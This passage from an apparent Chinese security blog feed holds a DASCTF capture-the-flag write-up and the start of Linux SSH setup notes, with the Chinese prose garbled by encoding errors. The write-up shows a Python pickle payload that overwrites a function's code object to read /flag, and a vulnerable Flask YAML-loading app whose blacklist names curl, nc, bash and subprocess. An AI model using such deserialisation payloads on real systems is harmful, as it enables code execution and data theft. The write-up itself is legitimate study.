string">"co_name"</span><span class="token punctuation">)</span>g15 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_firstlineno"</span><span class="token punctuation">)</span>g16 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_lnotab"</span><span class="token punctuation">)</span>g17 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_freevars"</span><span class="token punctuation">)</span>g18 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_cellvars"</span><span class="token punctuation">)</span>g19 <span class="token operator">=</span> types<span class="token punctuation">.</span>CodeType<span class="token punctuation">(</span>g3<span class="token punctuation">,</span>g4<span class="token punctuation">,</span>g5<span class="token punctuation">,</span>g6<span class="token punctuation">,</span>g7<span class="token punctuation">,</span>g8<span class="token punctuation">,</span>g9<span class="token punctuation">,</span>g10<span class="token punctuation">,</span>g11<span class="token punctuation">,</span>g12<span class="token punctuation">,</span>g13<span class="token punctuation">,</span>g14<span class="token punctuation">,</span>g15<span class="token punctuation">,</span>g16<span class="token punctuation">,</span>g17<span class="token punctuation">,</span>g18<span class="token punctuation">)</span>g20 <span class="token operator">=</span> builtins<span class="token punctuation">.</span><span class="token builtin">setattr</span>g20<span class="token punctuation">(</span>src<span class="token punctuation">,</span><span class="token string">"__code__"</span><span class="token punctuation">,</span>g19<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨æœ€æ–°ç‰ˆçš„pkerç”Ÿæˆpayloadï¼ˆ2025.1.1æ›´æ–°æ”¯æŒNoneTypeï¼‰</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">getattr</span> <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'getattr'</span><span class="token punctuation">)</span><span class="token builtin">open</span> <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">)</span><span class="token builtin">setattr</span> <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'setattr'</span><span class="token punctuation">)</span>CodeType <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'types'</span><span class="token punctuation">,</span> <span class="token string">'CodeType'</span><span class="token punctuation">)</span>src <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'__main__'</span><span class="token punctuation">,</span> <span class="token string">'src'</span><span class="token punctuation">)</span>g2 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span><span class="token string">"__code__"</span><span class="token punctuation">)</span>g3 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_argcount"</span><span class="token punctuation">)</span><span class="token comment"># g4 = getattr(g2,"co_posonlyargcount") å› ä¸ºä¼šban oså­—ç¬¦ä¸²ï¼Œäºæ˜¯ç”¨ co_argcount ä»£æ›¿</span>g4 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_argcount"</span><span class="token punctuation">)</span>g5 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_kwonlyargcount"</span><span class="token punctuation">)</span>g6 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_nlocals"</span><span class="token punctuation">)</span>g7 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_stacksize"</span><span class="token punctuation">)</span>g8 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_flags"</span><span class="token punctuation">)</span>g9 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_code"</span><span class="token punctuation">)</span>g10 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'encoding'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># g10 = getattr(g2,"co_consts")</span>g11 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_names"</span><span class="token punctuation">)</span>g12 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_varnames"</span><span class="token punctuation">)</span>g13 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_filename"</span><span class="token punctuation">)</span>g14 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_name"</span><span class="token punctuation">)</span>g15 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_firstlineno"</span><span class="token punctuation">)</span>g16 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_lnotab"</span><span class="token punctuation">)</span>g17 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_freevars"</span><span class="token punctuation">)</span>g18 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_cellvars"</span><span class="token punctuation">)</span>g19 <span class="token operator">=</span> CodeType<span class="token punctuation">(</span>g3<span class="token punctuation">,</span>g4<span class="token punctuation">,</span>g5<span class="token punctuation">,</span>g6<span class="token punctuation">,</span>g7<span class="token punctuation">,</span>g8<span class="token punctuation">,</span>g9<span class="token punctuation">,</span>g10<span class="token punctuation">,</span>g11<span class="token punctuation">,</span>g12<span class="token punctuation">,</span>g13<span class="token punctuation">,</span>g14<span class="token punctuation">,</span>g15<span class="token punctuation">,</span>g16<span class="token punctuation">,</span>g17<span class="token punctuation">,</span>g18<span class="token punctuation">)</span>g20 <span class="token operator">=</span> <span class="token builtin">setattr</span>g20<span class="token punctuation">(</span>src<span class="token punctuation">,</span><span class="token string">"__code__"</span><span class="token punctuation">,</span>g19<span class="token punctuation">)</span><span class="token keyword">return</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="yaml-matserï¼ˆUnsolvedï¼‰"><a href="#yaml-matserï¼ˆUnsolvedï¼‰" class="headerlink" title="yaml_matserï¼ˆUnsolvedï¼‰"></a>yaml_matserï¼ˆUnsolvedï¼‰</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> re<span class="token keyword">import</span> yaml<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token punctuation">,</span> render_templateapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> template_folder<span class="token operator">=</span><span class="token string">'templates'</span><span class="token punctuation">)</span>UPLOAD_FOLDER <span class="token operator">=</span> <span class="token string">'uploads'</span>os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token punctuation">:</span>    blacklist_terms <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'apply'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span><span class="token string">'os'</span><span class="token punctuation">,</span><span class="token string">'map'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'sleep'</span><span class="token punctuation">,</span> <span class="token string">'setstate'</span><span class="token punctuation">,</span>                       <span class="token string">'command'</span><span class="token punctuation">,</span><span class="token string">'static'</span><span class="token punctuation">,</span><span class="token string">'templates'</span><span class="token punctuation">,</span><span class="token string">'session'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'globals'</span><span class="token punctuation">,</span><span class="token string">'builtins'</span>                       <span class="token string">'run'</span><span class="token punctuation">,</span> <span class="token string">'ntimeit'</span><span class="token punctuation">,</span> <span class="token string">'bash'</span><span class="token punctuation">,</span> <span class="token string">'zsh'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'curl'</span><span class="token punctuation">,</span> <span class="token string">'nc'</span><span class="token punctuation">,</span> <span class="token string">'env'</span><span class="token punctuation">,</span> <span class="token string">'before_request'</span><span class="token punctuation">,</span> <span class="token string">'after_request'</span><span class="token punctuation">,</span>                       <span class="token string">'error_handler'</span><span class="token punctuation">,</span> <span class="token string">'add_url_rule'</span><span class="token punctuation">,</span><span class="token string">'teardown_request'</span><span class="token punctuation">,</span><span class="token string">'teardown_appcontext'</span><span class="token punctuation">,</span><span class="token string">'\\u'</span><span class="token punctuation">,</span><span class="token string">'\\x'</span><span class="token punctuation">,</span><span class="token string">'+'</span><span class="token punctuation">,</span><span class="token string">'base64'</span><span class="token punctuation">,</span><span class="token string">'join'</span><span class="token punctuation">&#125;</span>    input_str_lower <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>input_str<span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> term <span class="token keyword">in</span> blacklist_terms<span class="token punctuation">:</span>        <span class="token keyword">if</span> term <span class="token keyword">in</span> input_str_lower<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Found blacklisted term: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>term<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span>file_pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'.*\.yaml$'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">is_yaml_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">bool</span><span class="token punctuation">(</span>file_pattern<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''    Welcome to DASCTF X 0psu3    &lt;br>    Here is the challenge &lt;a href="/upload">Upload file&lt;/a>    &lt;br>    Enjoy it &lt;a href="/Yam1">Yam1&lt;/a>    '''</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            uploaded_file <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> uploaded_file <span class="token keyword">and</span> is_yaml_file<span class="token punctuation">(</span>uploaded_file<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>                file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">,</span> uploaded_file<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>                uploaded_file<span class="token punctuation">.</span>save<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>                <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"uploaded successfully"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token string">"Just YAML file"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"error"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">500</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/Yam1'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Yam1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    filename <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> filename<span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'uploads/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>filename<span class="token punctuation">&#125;</span></span><span class="token string">.yaml'</span></span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            file_content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> waf<span class="token punctuation">(</span>file_content<span class="token punctuation">)</span><span class="token punctuation">:</span>            test <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>file_content<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'welcome'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾ˆæ˜æ˜¾æ˜¯æ‰“ pyyaml ååºåˆ—åŒ–ï¼Œåªéœ€è¦è€ƒè™‘ç»• waf å³å¯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">blacklist_terms <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'apply'</span><span class="token punctuation">,</span> <span class="token string">'subprocess'</span><span class="token punctuation">,</span><span class="token string">'os'</span><span class="token punctuation">,</span><span class="token string">'map'</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'popen'</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">,</span> <span class="token string">'sleep'</span><span class="token punctuation">,</span> <span class="token string">'setstate'</span><span class="token punctuation">,</span>                       <span class="token string">'command'</span><span class="token punctuation">,</span><span class="token string">'static'</span><span class="token punctuation">,</span><span class="token string">'templates'</span><span class="token punctuation">,</span><span class="token string">'session'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'globals'</span><span class="token punctuation">,</span><span class="token string">'builtins'</span>                       <span class="token string">'run'</span><span class="token punctuation">,</span> <span class="token string">'ntimeit'</span><span class="token punctuation">,</span> <span class="token string">'bash'</span><span class="token punctuation">,</span> <span class="token string">'zsh'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'curl'</span><span class="token punctuation">,</span> <span class="token string">'nc'</span><span class="token punctuation">,</span> <span class="token string">'env'</span><span class="token punctuation">,</span> <span class="token string">'before_request'</span><span class="token punctuation">,</span> <span class="token string">'after_request'</span><span class="token punctuation">,</span>                       <span class="token string">'error_handler'</span><span class="token punctuation">,</span> <span class="token string">'add_url_rule'</span><span class="token punctuation">,</span><span class="token string">'teardown_request'</span><span class="token punctuation">,</span><span class="token string">'teardown_appcontext'</span><span class="token punctuation">,</span><span class="token string">'\\u'</span><span class="token punctuation">,</span><span class="token string">'\\x'</span><span class="token punctuation">,</span><span class="token string">'+'</span><span class="token punctuation">,</span><span class="token string">'base64'</span><span class="token punctuation">,</span><span class="token string">'join'</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>banäº†å¾ˆå¤šï¼Œä½†æ˜¯</p><hr><h1 id="strange-phpï¼ˆUnsolvedï¼‰"><a href="#strange-phpï¼ˆUnsolvedï¼‰" class="headerlink" title="strange_phpï¼ˆUnsolvedï¼‰"></a>strange_phpï¼ˆUnsolvedï¼‰</h1>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æ—¶éš”ä¸€å¹´ï¼Œè¿™æ¬¡è¿ç­¾åˆ°éƒ½å·®ç‚¹åšä¸æ¥äº†&lt;/p&gt;
&lt;p&gt;å”‰å”‰webåˆçˆ†é›¶äº†ï¼ŒåŸ‹äº†ï¼Œå¾—äº†ä¸€ç§æ‰“ DAS å°±åšä¸åŠ¨é¢˜çš„ç—…&lt;/p&gt;
&lt;p&gt;ç­‰æœŸæœ«è€ƒå®Œå†å¤ç°ï¼Œè¦è¢«æœŸæœ«è€ƒè–„çº±äº†ğŸ˜­&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/gxngxngxn/p/18620905&quot;&gt;https://www.cnblogs.com/gxngxngxn/p/18620905&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3gaim7fr89ed2?singleDoc#&quot;&gt;https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3gaim7fr89ed2?singleDoc#&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zer0peach.github.io/2024/12/30/DASCTF2024-%E5%AF%92%E5%A4%9C%E7%A0%B4%E6%99%93-%E5%86%AC%E8%87%B3%E7%BB%88%E7%AB%A0-web/&quot;&gt;https://zer0peach.github.io/2024/12/30/DASCTF2024-%E5%AF%92%E5%A4%9C%E7%A0%B4%E6%99%93-%E5%86%AC%E8%87%B3%E7%BB%88%E7%AB%A0-web/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>Linuxä»0.5åˆ°1</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/</id>
    <published>2024-12-15T17:47:48.000Z</published>
    <updated>2024-12-18T04:03:42.450Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœŸæœ«è‡ªæŸ¥ç”¨</p><span id="more"></span><hr><h1 id="VMwareé…ç½®"><a href="#VMwareé…ç½®" class="headerlink" title="VMwareé…ç½®"></a>VMwareé…ç½®</h1><h2 id="å®‰è£…RHEL6-3"><a href="#å®‰è£…RHEL6-3" class="headerlink" title="å®‰è£…RHEL6.3"></a>å®‰è£…RHEL6.3</h2><p>è™šæ‹Ÿç£ç›˜è®¾ç½®ä¸º30Gï¼Œé‡‡ç”¨åŠ¨æ€åˆ†é…ç¡¬ç›˜æ–¹å¼ï¼Œå¹¶è®¾ç½®ä¸ºåˆ†å‰²å¤šä¸ªå°æ–‡ä»¶</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps1.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps2.jpg" alt="img"></p><p>DVD å¯¼å…¥å‡†å¤‡çš„å…‰ç›˜ï¼Œä½¿ç”¨ ISO æ˜ åƒæ–‡ä»¶</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps3.jpg" alt="img"></p><p>æ­£å¼è¿›å…¥å®‰è£…ç•Œé¢</p><p>ç£ç›˜åˆ†åŒºï¼š</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps4.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps5.jpg" alt="img"></p><p>è‡ªå®šä¹‰è½¯ä»¶å®‰è£…åŒ…</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps8.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps6.jpg" alt="img"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps7.jpg" alt="img"></p><hr><h2 id="ç½‘ç»œè®¾ç½®"><a href="#ç½‘ç»œè®¾ç½®" class="headerlink" title="ç½‘ç»œè®¾ç½®"></a>ç½‘ç»œè®¾ç½®</h2><p>ä»¥ NAT æ¨¡å¼ä¸ºä¾‹ï¼Œè¿™æ ·å­ä¸»æœºç›¸å½“äºè·¯ç”±å™¨ï¼Œç»™è™šæ‹Ÿæœºåˆ†é…ä¸€å±‚å†…ç½‘åœ°å€ï¼ˆæ¡¥æ¥æ¨¡å¼åˆ™ä¼šå’Œä¸»æœºåœ¨åŒä¸€ç½‘æ®µåˆ†é… ip åœ°å€ï¼‰</p><p>è™šæ‹Ÿæœºç½‘ç»œè®¾ç½®ä¸º NAT æ¨¡å¼</p><p>ä¸»æœºç½‘ç»œé€‚é…å™¨å¯åŠ¨ VMnet8  ç½‘å¡</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216101636472.png" alt="image-20241216101636472"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216101704214.png" alt="image-20241216101704214"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216101801687.png" alt="image-20241216101801687"></p><p>ç„¶åä¿è¯å³ä¸‹è§’è¿™ä¸ªå›¾æ ‡å¤„äºå¯åŠ¨çŠ¶æ€</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241216102028365.png" alt="image-20241216102028365"></p><p>åŒæ—¶è™šæ‹Ÿæœºå†…è¿æ¥ç½‘ç»œï¼Œè¿™é‡Œæ˜¯ System eth0</p><p>ç„¶åä¸»æœºå’Œè™šæ‹Ÿæœºä¹‹é—´ç›¸äº’pingä¸€ä¸‹æµ‹è¯•ç½‘ç»œè¿é€šæ€§ï¼ˆä¸»æœºéœ€å…³é—­é˜²ç«å¢™æ‰èƒ½è¢« ping é€šï¼‰</p><h2 id="sshè¿œç¨‹ç™»å½•"><a href="#sshè¿œç¨‹ç™»å½•" class="headerlink" title="sshè¿œç¨‹ç™»å½•"></a>sshè¿œç¨‹ç™»å½•</h2><h3 id="å¯åŠ¨-ssh-æœåŠ¡"><a href="#å¯åŠ¨-ssh-æœåŠ¡" class="headerlink" title="å¯åŠ¨ ssh æœåŠ¡"></a>å¯åŠ¨ ssh æœåŠ¡</h3><p>debian ç³»</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> openssh-server<span class="token function">sudo</span> <span class="token function">service</span> <span class="token function">ssh</span> start <span class="token comment"># å¯åŠ¨æœåŠ¡</span><span class="token function">sudo</span> systemctl start <span class="token function">ssh</span> <span class="token comment"># è¾ƒæ–°çš„ç³»ç»Ÿå¯åŠ¨æœåŠ¡</span><span class="token function">sudo</span> /etc/init.d/ssh restart <span class="token comment"># é‡å¯æœåŠ¡</span><span class="token comment"># æˆ–</span><span class="token function">sudo</span> systemctl restart <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>centos ç³»</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> openssh-server<span class="token function">sudo</span> <span class="token function">service</span> sshd start<span class="token comment"># æˆ–</span><span class="token function">sudo</span> systemctl start sshd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ£€æŸ¥æ˜¯å¦å¯åŠ¨</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> <span class="token parameter variable">-e</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">ssh</span><span class="token function">netstat</span> <span class="token parameter variable">-an</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="é…ç½®-ssh"><a href="#é…ç½®-ssh" class="headerlink" title="é…ç½® ssh"></a>é…ç½® ssh</h3><p>å…è®¸å¯†ç èº«ä»½éªŒè¯ï¼šç¼–è¾‘ &#x2F;etc&#x2F;ssh&#x2F;ssh_config æ–‡ä»¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PasswordAuthentication <span class="token function">yes</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å…è®¸rootç”¨æˆ·ç™»å½•ï¼šç¼–è¾‘ &#x2F;etc&#x2F;ssh&#x2F;ssh_config æ–‡ä»¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># PermitRootLogin prohibit-password</span>PermitRootLogin <span class="token function">yes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>é‡æ–°åŠ è½½sshé…ç½®ï¼šé‡è½½æˆ–é‡å¯</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl reload <span class="token function">ssh</span><span 